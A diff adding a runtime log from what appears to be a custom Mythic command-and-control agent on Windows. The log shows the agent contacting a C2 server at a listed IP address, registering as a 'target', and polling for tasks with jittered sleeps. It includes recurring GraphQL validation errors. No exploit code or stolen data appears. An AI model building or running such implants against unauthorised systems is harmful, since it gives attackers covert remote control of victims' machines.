@@ -1,0 +1,96 @@
+[2025-06-16 20:37:35] === PHANTOM MYTHIC AGENT - FINAL VERSION ===
+[2025-06-16 20:37:35] Running on: windows amd64
+[2025-06-16 20:37:35] Process ID: 4948
+[2025-06-16 20:37:35] Mythic URL: https://37.27.249.191:7443/graphql/
+[2025-06-16 20:37:35] Using Payload UUID: 9df7dfc4-f21d-4b03-9962-9f3272669b85
+[2025-06-16 20:37:35] Initial delay: 3s
+[2025-06-16 20:37:38] Registering callback with valid payload UUID...
+[2025-06-16 20:37:39] GraphQL Response: {"data":{"createCallback":{"status":"success","error":null}}}
+[2025-06-16 20:37:39] ✓ SUCCESSFULLY REGISTERED WITH MYTHIC!
+[2025-06-16 20:37:39] Target should now appear in Mythic dashboard
+[2025-06-16 20:37:39] Starting main communication loop...
+[2025-06-16 20:37:39] Loop iteration 1
+[2025-06-16 20:37:39] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:37:39] Checking for new tasks...
+[2025-06-16 20:37:39] Sleeping for: 5s
+[2025-06-16 20:37:44] Loop iteration 2
+[2025-06-16 20:37:44] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:37:44] Checking for new tasks...
+[2025-06-16 20:37:44] Sleeping for: 7s
+[2025-06-16 20:37:51] Loop iteration 3
+[2025-06-16 20:37:51] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:37:51] Checking for new tasks...
+[2025-06-16 20:37:51] Sleeping for: 5s
+[2025-06-16 20:37:56] Loop iteration 4
+[2025-06-16 20:37:57] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:37:57] Checking for new tasks...
+[2025-06-16 20:37:57] Sleeping for: 5s
+[2025-06-16 20:38:02] Loop iteration 5
+[2025-06-16 20:38:02] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:02] Checking for new tasks...
+[2025-06-16 20:38:02] GraphQL Response: {"errors":[{"message":"field 'agent_callback_id' not found in type: 'updateCallbackInput'","extensions":{"path":"$.selectionSet.updateCallback.args.input.agent_callback_id","code":"validation-failed"}}]}
+[2025-06-16 20:38:02] Sleeping for: 7s
+[2025-06-16 20:38:09] Loop iteration 6
+[2025-06-16 20:38:09] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:09] Checking for new tasks...
+[2025-06-16 20:38:09] Sleeping for: 5s
+[2025-06-16 20:38:14] Loop iteration 7
+[2025-06-16 20:38:15] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:15] Checking for new tasks...
+[2025-06-16 20:38:15] Sleeping for: 5s
+[2025-06-16 20:38:20] Loop iteration 8
+[2025-06-16 20:38:20] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:20] Checking for new tasks...
+[2025-06-16 20:38:20] Sleeping for: 7s
+[2025-06-16 20:38:27] Loop iteration 9
+[2025-06-16 20:38:27] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:27] Checking for new tasks...
+[2025-06-16 20:38:27] Sleeping for: 5s
+[2025-06-16 20:38:32] Loop iteration 10
+[2025-06-16 20:38:32] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:32] Checking for new tasks...
+[2025-06-16 20:38:33] GraphQL Response: {"errors":[{"message":"field 'agent_callback_id' not found in type: 'updateCallbackInput'","extensions":{"path":"$.selectionSet.updateCallback.args.input.agent_callback_id","code":"validation-failed"}}]}
+[2025-06-16 20:38:33] Sleeping for: 5s
+[2025-06-16 20:38:38] Loop iteration 11
+[2025-06-16 20:38:38] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:38] Checking for new tasks...
+[2025-06-16 20:38:38] Sleeping for: 7s
+[2025-06-16 20:38:45] Loop iteration 12
+[2025-06-16 20:38:45] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:45] Checking for new tasks...
+[2025-06-16 20:38:45] Sleeping for: 5s
+[2025-06-16 20:38:50] Loop iteration 13
+[2025-06-16 20:38:50] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:50] Checking for new tasks...
+[2025-06-16 20:38:50] Sleeping for: 7s
+[2025-06-16 20:38:57] Loop iteration 14
+[2025-06-16 20:38:58] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:38:58] Checking for new tasks...
+[2025-06-16 20:38:58] Sleeping for: 6s
+[2025-06-16 20:39:04] Loop iteration 15
+[2025-06-16 20:39:58] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:39:58] Checking for new tasks...
+[2025-06-16 20:39:58] GraphQL Response: {"errors":[{"message":"field 'agent_callback_id' not found in type: 'updateCallbackInput'","extensions":{"path":"$.selectionSet.updateCallback.args.input.agent_callback_id","code":"validation-failed"}}]}
+[2025-06-16 20:39:58] Sleeping for: 6s
+[2025-06-16 20:40:04] Loop iteration 16
+[2025-06-16 20:40:05] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:40:05] Checking for new tasks...
+[2025-06-16 20:40:05] Sleeping for: 7s
+[2025-06-16 20:40:12] Loop iteration 17
+[2025-06-16 20:40:12] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:40:12] Checking for new tasks...
+[2025-06-16 20:40:12] Sleeping for: 5s
+[2025-06-16 20:40:17] Loop iteration 18
+[2025-06-16 20:40:17] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:40:17] Checking for new tasks...
+[2025-06-16 20:40:17] Sleeping for: 7s
+[2025-06-16 20:40:24] Loop iteration 19
+[2025-06-16 20:40:24] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:40:24] Checking for new tasks...
+[2025-06-16 20:40:24] Sleeping for: 5s
+[2025-06-16 20:40:29] Loop iteration 20
+[2025-06-16 20:40:30] GraphQL Response: {"data":{"callback":[]}}
+[2025-06-16 20:40:30] Checking for new tasks...
+[2025-06-16 20:40:30] GraphQL Response: {"errors":[{"message":"field 'agent_callback_id' not found in type: 'updateCallbackInput'","extensions":{"path":"$.selectionSet.updateCallback.args.input.agent_callback_id","code":"validation-failed"}}]}
+[2025-06-16 20:40:30] Sleeping for: 5s
+[2025-06-16 20:40:35] Agent execution completed - check Mythic dashboard for registered target
